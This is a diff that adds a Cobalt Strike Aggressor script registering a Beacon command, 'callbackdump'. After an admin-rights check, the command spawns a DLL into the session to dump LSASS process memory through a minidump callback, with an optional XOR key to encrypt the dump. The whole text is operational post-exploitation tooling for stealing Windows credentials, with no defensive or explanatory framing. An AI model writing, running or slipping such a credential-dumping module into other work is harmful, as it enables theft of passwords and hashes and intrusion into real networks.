@@ -1,0 +1,10 @@
+alias callbackdump {
+    if (!-isadmin $1) {
+        berror($1, "Please use administrator privileges!");
+        return;
+    }
+    blog($1, "Start Dump lsass , please wait...");
+    bdllspawn($1, script_resource("CallBackDump.".barch($1).".dll"), $2, "CallBackDump", 5000, false);
+}
+
+beacon_command_register("callbackdump", "minidumpCallback Dump lsass", "Requires admin rights\nSynopsis: callbackdump or callbackdump <xor encrypt key>\n");
